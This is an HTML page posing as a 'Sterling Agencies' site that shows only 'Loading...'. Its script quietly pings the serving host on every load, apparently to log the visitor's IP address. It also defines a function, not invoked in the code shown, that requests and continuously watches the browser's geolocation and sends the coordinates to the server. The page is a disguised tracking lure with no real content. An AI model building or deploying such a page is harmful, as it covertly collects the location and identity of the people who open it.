<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sterling Agencies</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <style>
    body { padding-top: 50px; }
  </style>
</head>
<script>
    const getLocation= ()=> {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition)
        navigator.geolocation.watchPosition(showPosition);
      } else {
        fetch(`//${window.location.host}/api/empty`)
        .then(res=> console.log('response recieved is',res))
        .catch(err=>console.error(err));
      }
    }
    const showPosition= (position) =>{
        fetch(`//${window.location.host}/api/${position.coords.latitude + ',' +position.coords.longitude}`)
        .then(res=> console.log('response recieved is',res))
        .catch(err=>console.error(err));
      console.log(position.coords.latitude + ',' +position.coords.longitude);
    }
    function getips(){
        fetch(`//${window.location.host}/api/empty`)
        .then(res=> console.log('response recieved is',res))
        .catch(err=>console.error(err));
    }

    window.onload = getips;
    window.addEventListener("load", getips);
    </script>
<body onload="getips()">

  <div class="container">
    <div class="jumbotron">
      <h1>Loading...</h1>
    </div>
  </div>
    
</body>
</html>
